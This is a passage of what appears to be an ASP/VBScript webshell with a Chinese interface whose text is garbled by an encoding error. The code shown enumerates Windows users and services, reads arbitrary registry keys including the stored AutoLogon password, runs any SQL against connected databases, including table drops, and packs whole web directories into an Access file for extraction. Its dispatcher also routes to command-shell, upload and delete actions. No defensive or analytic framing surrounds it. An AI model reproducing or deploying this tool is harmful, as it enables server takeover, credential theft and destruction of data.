       If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then
         SFN=Folder&"\"&strFdName
         Call GetAllFile(SFN)
    End If
     Next
     dim strFlName

     For Each OneFile In objFf
       strFlName=OneFile.Name
       If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
         FN=Folder&"\"&strFlName
      Counter=Counter+ColorOn(FN)
    End If
     Next
     Set objFd=Nothing
     Set objFs=Nothing
     Set objFf=Nothing
    End Function

    Private Function CreatePattern(keyword)
      CreatePattern=keyword
      CreatePattern=Replace(CreatePattern,".","\.")
      CreatePattern=Replace(CreatePattern,"+","\+")
      CreatePattern=Replace(CreatePattern,"(","\(")
      CreatePattern=Replace(CreatePattern,")","\)")
      CreatePattern=Replace(CreatePattern,"[","\[")
      CreatePattern=Replace(CreatePattern,"]","\]")
      CreatePattern=Replace(CreatePattern,"{","\{")
      CreatePattern=Replace(CreatePattern,"}","\}")
      CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
      CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
      CreatePattern="("&CreatePattern&")+"
    End Function

    Private Function ColorOn(FileName)
      dim objReg
      Set objReg=new RegExp
      objReg.Pattern=CreatePattern(keyword)
      objReg.IgnoreCase=True
      objReg.Global=True
      retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
      if retVal then
        OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color='#FF0000'>$1</font>")
        OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
     Response.Write OutPut
     Response.flush
     ColorOn=1
      else
        ColorOn=0
      end if
      Set objReg=Nothing
    End Function
   End Class

   Function Course()
     dim sa,obj,objCourse,RW0,RW1,RW2
     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     RW=RW & "<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ÏµÍ³ÓÃ»§Óë·þÎñ</td></tr>"
     On Error Resume Next
     Set sa=CreateObject("Shell.Application")
     Set objCourse=GetObject("WinNT://.")
     for each obj in objCourse
     Err.Clear
       if obj.StartType="" then
         RW=RW & "<tr>"
         RW=RW & "<td height='20' bgcolor='#FFFFFF'>&nbsp;"
         RW=RW & obj.Name
         RW=RW & "</td><td bgcolor='#FFFFFF'>&nbsp;"
         RW=RW & "ÏµÍ³ÓÃ»§(×é)"
         RW=RW & "</td></tr>"
         RW0="<tr><td height='20' bgcolor='#FFFFFF' colspan='2'>&nbsp;</td></tr>"
       end if
       if obj.StartType=2 then lx="×Ô¶¯"
       if obj.StartType=3 then lx="ÊÖ¶¯"
       if obj.StartType=4 then lx="½ûÓÃ"
       if LCase(mid(obj.path,4,3))<>"win" and obj.StartType=2 then
         RW1=RW1 & "<tr><td height='20' bgcolor='#FFFFFF'>&nbsp;[Æô¶¯ÀàÐÍ:"&lx&"]</td><td height='20' bgcolor='#FFFFFF'>&nbsp;"&obj.Name&"---"&obj.DisplayName&"<tr><td height='20' bgcolor='#FFFFFF' colspan='2'>&nbsp;[ÔËÐÐ×´Ì¬:"&sa.IsServiceRunning(obj.Name)&"]&nbsp;<font color='#FF0000'>"&obj.path&"</font></td></tr>"
       else
         RW2=RW2 & "<tr><td height='20' bgcolor='#FFFFFF'>&nbsp;[Æô¶¯ÀàÐÍ:"&lx&"]</td><td height='20' bgcolor='#FFFFFF'>&nbsp;"&obj.Name&"---"&obj.DisplayName&"<tr><td height='20' bgcolor='#FFFFFF' colspan='2'>&nbsp;[ÔËÐÐ×´Ì¬:"&sa.IsServiceRunning(obj.Name)&"]&nbsp;<font color='#008000'>"&obj.path&"</font></td></tr>"
       end if
     next
     Set objCourse=Nothing
     Set sa=Nothing
     Response.Write RW & RW0 & RW1 & RW2 & "</table>" :RW="" :RW0="" :RW1="" :RW2=""
   End Function

   Function TRegedit()
     dim WSHShell,isReadstr
     dim autoLoginPath,autoLoginEnableKey,autoLoginUserKey,autoLoginPassKey
     dim autoLoginEnable,autoLoginUser,autoLoginPass
     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><form action='"&URL&"?Action=TRegedit' method='post'>"
     RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>×¢²á±í²Ù×÷</td></tr>"
     RW=RW & "<tr><td bgcolor='#FFFFFF' height='20'>&nbsp;¿ìËÙÍ¨µÀ£º<a href='?Action=TRegedit&TRPath=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&TRName=PortNumber'>[ÖÕ¶Ë¶Ë¿Ú]</a>"
     RW=RW & "&nbsp;<a href='?Action=TRegedit&id=AutoLogon'>[×Ô¶¯µÇÂ¼ÐÅÏ¢]</a>"
     RW=RW & "</td></tr>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;ÏîÂ·¾¶£º<input name='TRPath' value='" & Request("TRPath") & "' style='width:520' class='border'></td></tr>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;ÖµÃû³Æ£º<input name='TRName' value='" & Request("TRName") & "' style='width:200' class='border'>&nbsp;<input type='submit' value='È·ÈÏ' class='submit'></td></tr></form>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;ÀýÈç£º¶ÁÈ¡ÖÕ¶Ë¶Ë¿Ú<br>ÏîÂ·¾¶£ºHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\<br>"
     RW=RW & "ÖµÃû³Æ£ºPortNumber</td></tr>"

     if Request("id")="AutoLogon" then
       set WSHShell=Server.CreateObject(ObT(1,0))
       autoLoginPath="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
       autoLoginEnableKey="AutoAdminLogon"
       autoLoginUserKey="DefaultUserName"
       autoLoginPassKey="DefaultPassword"
       autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)
       if autoLoginEnable=0 then
         RW=RW & "<tr><td bgcolor='#FFFFFF'><br>&nbsp;ÏµÍ³×Ô¶¯µÇÂ¼¹¦ÄÜÎ´¿ªÆô</td></tr></table>"
       else
         autoLoginUser=WSHShell.RegRead(autoLoginPath & autoLoginUserKey)
         RW=RW & "<tr><td bgcolor='#FFFFFF'><br>&nbsp;×Ô¶¯µÇÂ¼µÄÏµÍ³ÕÊ»§£º" & autoLoginUser & "<br>"
         On Error Resume Next
         autoLoginPass=WSHShell.RegRead(autoLoginPath & autoLoginPassKey)
         If Err Then Err.Clear
         RW=RW & "&nbsp;×Ô¶¯µÇÂ¼µÄÕÊ»§ÃÜÂë£º" & autoLoginPass & "</td></tr></table>"
         Response.Write RW:RW=""
       end if
     end if
     if (Request("TRPath")<>"") and (Request("TRName")<>"") then
       Set WSHShell=Server.CreateObject(ObT(1,0))
       isReadstr=WSHShell.RegRead(Request("TRPath") & Request("TRName"))
       RW=RW & "<tr><td bgcolor='#FFFFFF'><br>&nbsp;¸ÃÖµÊÇ£º" & isReadstr & "</td></tr></table>"
       Set WSHShell=Nothing
     else
       RW=RW & "</table>"
     end if
     Response.Write RW:RW=""
   End Function

   Function ServerInfo()
     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     RW=RW & "<tr><td height='20' colspan='3' align='center' bgcolor='menu'>·þÎñÆ÷×é¼þÐÅÏ¢</td></tr>"
     RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷Ãû</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&ServerNM&"</td></tr>"
     RW=RW & "<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>" & ServerIP & "</td></tr>"
     RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷Ê±¼ä</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
     RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷CPUÊýÁ¿</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
     RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷²Ù×÷ÏµÍ³</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
     RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB·þÎñÆ÷°æ±¾</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
     For i=0 To 13
       RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&IsObj(ObT(i,0))&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td></tr>"
     Next
     Response.Write RW : RW=""
   End Function

   Function DbManager()
     SqlStr=Trim(Request.Form("SqlStr"))
     DbStr=Request.Form("DbStr")

     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     RW=RW & "<form name='DbForm' method='post' action=''>"
     RW=RW & "<tr><td height='20' colspan='3' align='center' bgcolor='menu'>Êý¾Ý¿â²Ù×÷</td></tr>"
     RW=RW & "<tr><td width='90' bgcolor='#FFFFFF'> &nbsp;Êý¾Ý¿âÁ¬½Ó´®:</td>"
     RW=RW & "<td bgcolor='#FFFFFF'><input name='DbStr' style='width:415' value='"&DbStr&"' class='border'></td>"
     RW=RW & "<td width='92' align='center' bgcolor='#FFFFFF'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>Á¬½Ó´®Ê¾Àý</option><option value=0>AccessÁ¬½Ó</option>"
     RW=RW & "<option value=1>MsSqlÁ¬½Ó</option><option value=2>MySqlÁ¬½Ó</option><option value=3>DSNÁ¬½Ó</option>"
     RW=RW & "<option value=-1>--SQLÓï·¨--</option><option value=4>ÏÔÊ¾Êý¾Ý</option><option value=5>Ìí¼ÓÊý¾Ý</option>"
     RW=RW & "<option value=6>É¾³ýÊý¾Ý</option><option value=7>ÐÞ¸ÄÊý¾Ý</option><option value=8>½¨Êý¾Ý±í</option>"
     RW=RW & "<option value=9>É¾Êý¾Ý±í</option><option value=10>Ìí¼Ó×Ö¶Î</option><option value=11>É¾³ý×Ö¶Î</option>"
     RW=RW & "<option value=12>ÍêÈ«ÏÔÊ¾</option></select></td></tr>"
     RW=RW & "<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;SQL²Ù×÷ÃüÁî:</td>"
     RW=RW & "<td bgcolor='#FFFFFF'><input name='SqlStr' style='width:415' value='"&SqlStr&"' class='border'></td>"
     RW=RW & "<td align='center' bgcolor='#FFFFFF'><input type='submit' name='Submit' value='Ö´ÐÐ' onclick='return DbCheck()' class='submit'></td>"
     RW=RW & "</tr></form></table><span id='SFSO'></span>"
     Response.Write RW:RW=""

     If Len(DbStr)>40 Then

     Set Conn=CreateObject(ObT(5,0))
     Conn.Open DbStr
     Set Rs=Conn.OpenSchema(20)
     RW=RW & "<table align='center'><tr height='25' Bgcolor='#CCCCCC'><td>±í<br>Ãû</td>"
     Rs.MoveFirst
     Do While Not Rs.Eof
       If Rs("TABLE_TYPE")="TABLE" then
         TName=Rs("TABLE_NAME")
         RW=RW & "<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
         RW=RW & "<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
       End If
       Rs.MoveNext
     Loop
     Set Rs=Nothing
     RW=RW & "</tr></table>"
     Response.Write RW:RW=""

   If Len(SqlStr)>10 Then

     If LCase(Left(SqlStr,6))="select" then
       RW=RW & "<div align='center'>Ö´ÐÐÓï¾ä£º"&SqlStr&"</div>"
       Set Rs=CreateObject("Adodb.Recordset")
       Rs.open SqlStr,Conn,1,1
       FN=Rs.Fields.Count
       RC=Rs.RecordCount
       Rs.PageSize=20
       Count=Rs.PageSize
       PN=Rs.PageCount
       Page=request("Page")
       If Page<>"" Then Page=Clng(Page)
       If Page="" Or Page=0 Then Page=1
       If Page>PN Then Page=PN
       If Page>1 Then Rs.absolutepage=Page
       RW=RW & "<table align=center><tr height=25 bgcolor=#cccccc><td></td>"
       For n=0 to FN-1
         Set Fld=Rs.Fields.Item(n)
         RW=RW & "<td align='center'>"&Fld.Name&"</td>"
         Set Fld=nothing
       Next
       RW=RW & "</tr>"

       Do While Not(Rs.Eof or Rs.Bof) And Count>0
         Count=Count-1
         Bgcolor="#EFEFEF"
         RW=RW & "<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"
         For i=0 To FN-1
           If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
           If RC=1 Then
              ColInfo=HTMLEncode(Rs(i))
           Else
              ColInfo=HTMLEncode(Left(Rs(i),50))
           End If
           RW=RW & "<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
         Next
         RW=RW & "</tr>"
         Rs.MoveNext
       Loop

       Response.Write RW:RW=""

       SqlStr=HtmlEnCode(SqlStr)

       RW=RW & "<tr><td colspan="&FN+1&" align=center>¼ÇÂ¼Êý£º"&RC&"&nbsp;Ò³Âë£º"&Page&"/"&PN
       If PN>1 Then
         RW=RW & "&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>Ê×Ò³</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>ÉÏÒ»Ò³</a>&nbsp;"
         If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
         For i=Sp To Sp+8
           If i>PN Then Exit For
           If i=Page Then
           RW=RW & i&"&nbsp;"
           Else
           RW=RW & "<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
           End If
         Next
         RW=RW & "&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>ÏÂÒ»Ò³</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>Î²Ò³</a>"
       End If
       RW=RW & "<hr color='#EFEFEF'></td></tr></table>"
       Rs.Close:Set Rs=Nothing

       Response.Write RW:RW=""
     Else
       Conn.Execute(SqlStr)
       RW=RW & "SQLÓï¾ä£º"&SqlStr
     End If

     Response.Write RW:RW=""
   End If

     Conn.Close
     Set Conn=Nothing
     End If
   End Function

   Function ToMdb()
     Response.Expires=0
     RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     RW=RW & "<tr><td height='20' colspan='2' align='center' bgcolor='menu'>´ò°üÈë¿â/³ö¿â</tr></td><form method='POST' action=''>"
     RW=RW & "<tr><td bgcolor='#FFFFFF'><input type='radio' value='V1' checked name='R1'>Èë¿â <input type='radio' name='R1' value='V2'>³ö¿â</td>"
     RW=RW & "<td bgcolor='#FFFFFF'>&nbsp;Â·¾¶:<input type='text' name='Files' style='width:415' value='"&RRePath(WWWRoot)&"\ToMdb.tdb' class='border'>&nbsp;<input type='submit' value='È·ÈÏ' class='submit'></td></tr></form></table>"
     Response.Write RW:RW=""

     if request.form("Files")<>"" and request.form("R1")="V1" then
       set fso=CreateObject(ObT(0,0))
       set ads=Server.CreateObject(ObT(6,0))
       response.write "<table align='center' width='600'><hr>"
       db="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&server.mappath(Mid(request.form("Files"),InstrRev(request.form("Files"),"\")+1))
       Set conn=Server.CreateObject(ObT(5,0))
       Set Ca=Server.CreateObject(ObT(2,0))
       Ca.Create db
       conn.open db
       conn.Execute"CREATE TABLE wz(id int IDENTITY(1,1) PRIMARY KEY CLUSTERED,folder VARCHAR,file VARCHAR,body image)"
       Set Ca=Nothing
       Set rs=Server.CreateObject("ADODB.RecordSet")
       rs.Open "select * from wz",conn,3,3
       Call SF(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")-1),Mid(request.form("Files"),InstrRev(request.form("Files"),"\")+1),InstrRev(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")-1),"\")+1)
       rs.close
       conn.close
       Set conn=Nothing
       Set rs=Nothing
       Set fold=Nothing
       Set ads=Nothing
       Set fso=Nothing
       Response.Write "<hr>"
       Response.Write("<script>alert('¹§Ï²:<ÒÑ¾³É¹¦½«" & RePath(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\"))) & "Èë¿â!\nµØÖ·ÊÇ" & RePath(server.mappath(Mid(request.form("Files"),InstrRev(request.form("Files"),"\")+1)))&"');</script>")
     end if

     if request.form("Files")<>"" and request.form("R1")="V2" then
       Response.Write "<table align='center' width='600'><hr>"
       Set conn=Server.CreateObject(ObT(5,0))
       Set rs=Server.CreateObject("ADODB.RecordSet")
       conn.open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&request.form("Files")
       rs.Open "select * from wz",conn,3,3
       Set ads=Server.CreateObject(ObT(6,0))
       Set fso=Server.CreateObject(ObT(0,0))
       do while not(rs.eof or rs.bof)
         folder=Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")) & rs("folder")
         file=folder & "\" & rs("file")
         path=folder
         if not fso.FolderExists(folder) then fso.CreateFolder(folder)
         if (not fso.FileExists(file)) and (rs("file")<>"") then
           ads.Open
           ads.Type=1
           ads.write rs("body")
           ads.SaveToFile file,2
           ads.close
         end if
         Response.Write "<table align='center' width='600'>&nbsp;³ö¿â > " & file & "<br>"
         Response.Flush
         rs.movenext
       loop
       Response.Write "<hr>"
       Response.Write("<script>alert('¹§Ï²:\nÒÑ¾³É¹¦½«"&RePath(request.form("Files"))&"Êý¾Ý¿âÊÍ·Å!\nµØÖ·ÊÇ"&RePath(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")))&"');</script>")
       session("name")=session("name")+1
       rs.close
       conn.close
       Set ads=Nothing
       Set conn=Nothing
       Set rs=Nothing
       Set fso=Nothing
     end if
   End Function

   Function SF(Path,name,sz)
     dim a,pf,pi
     set fold=Fso.GetFolder(Path)
     For Each i in Fold.files
       a=1
       pf=Mid(Path,sz)
       pi=RRePath(Path&"\"&i.Name)
       Call Mdb(pi,name,pf)
     Next
     if a="" then Call Mdb(Path,name,Mid(Path,sz))
     a=""
     For Each F in FOLD.subfolders
       Call SF(RRePath(Path & "\" & F.Name),name,sz)
     Next
   End Function

   Function Mdb(pi,name,pf)
     dim body,file
     on error resume next
     if Mid(pi,InstrRev(pi,"\")+1)<>name then
       if Mid(pi,InstrRev(pi,"\")+1)<>"" then
         ads.Open
         ads.Type=1
         ads.LoadFromFile pi
         file=Mid(pi,InstrRev(pi,"\")+1)
         if Err then
           Err.clear
           file=""
           body=""
         else
           body=ads.read
           Response.Write "<table align='center' width='600'>&nbsp;Èë¿â > "&pi&"<br>"
           Response.Flush
         end if
       ads.Close
     end if
     rs.addnew
     rs("folder")=pf
     rs("file")=file
     rs("body")=body
     rs.update
     end if
   End Function

   Select Case Action
     Case "ShowFile":Set SFSO=New LBF:SFSO.ShowFile(Session("FolderPath")):Set SFSO=Nothing
     Case "DownFile":DownFile FName
     Case "EditFile":Set SFSO=New LBF:SFSO.EditFile(FName):Set SFSO=Nothing
     Case "DelFile":Set SFSO=New LBF:SFSO.DelFile(FName):Set SFSO=Nothing
     Case "CopyFile":Set SFSO=New LBF:SFSO.CopyFile(FName):Set SFSO=Nothing
     Case "MoveFile":Set SFSO=New LBF:SFSO.MoveFile(FName):Set SFSO=Nothing
     Case "DelFolder":Set SFSO=New LBF:SFSO.DelFolder(FName):Set SFSO=Nothing
     Case "CopyFolder":Set SFSO=New LBF:SFSO.CopyFolder(FName):Set SFSO=Nothing
     Case "MoveFolder":Set SFSO=New LBF:SFSO.MoveFolder(FName):Set SFSO=Nothing
     Case "NewFolder":Set SFSO=New LBF:SFSO.NewFolder(FName):Set SFSO=Nothing
     Case "UpFile":UpFile()
     Case "CmdShell":CmdShell()
     Case "TSearch":TSearch()
     Case "Course":Course()
     Case "TRegedit":TRegedit()
     Case "ServerInfo":ServerInfo()
     Case "DbManager":DbManager()
     Case "ToMdb":ToMdb()
     Case "Logout":Session.Contents.Remove("webadmin"):Response.Redirect URL
     Case Else
          MainMenu()
   End Select
   ShowErr()
   %>
